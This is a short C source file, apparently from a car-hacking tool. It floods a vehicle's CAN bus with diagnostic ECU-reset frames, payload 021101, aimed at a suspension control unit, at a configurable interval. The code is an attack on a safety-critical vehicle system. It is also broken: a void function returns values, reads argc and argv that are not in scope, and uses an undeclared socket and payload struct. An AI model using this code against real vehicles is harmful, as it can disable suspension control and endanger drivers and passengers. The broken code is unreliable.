#include "all_headers.h"

void suspension_resetecu(int socket, struct sockaddr_can *addr, int canid, int time_diff) {
    if (argc != 5 || strcmp(argv[3], "-diff") != 0) {
        printf("Usage: %s [can_interface] [can_id] -diff [time_interval]\n", argv[0]);
        return 1;
    }

    int can_id = canid;
    int interval = time_diff;

    struct can_frame frame;
    frame.can_id = can_id;
    frame.can_dlc = 3;

    do {
        memcpy(frame.data, suspension.payload1, 3);
        send_can_frame(s, frame, addr);
        printf("Sent CAN frame with ID 0x%X and payload: %02X %02X %02X\n",
               frame.can_id, frame.data[0], frame.data[1], frame.data[2]);

        // 두 번째 페이로드 전송 (021101)
        memcpy(frame.data, suspension.payload2, 3);
        send_can_frame(s, frame, addr);
        printf("Sent CAN frame with ID 0x%X and payload: %02X %02X %02X\n",
               frame.can_id, frame.data[0], frame.data[1], frame.data[2]);

        // 사이클 간격 대기
        if (interval == 0) {
            break;
        }

        usleep(interval * 1000); // ms 단위로 간격 유지

    } while (1);

    close(s);
    return 0;
}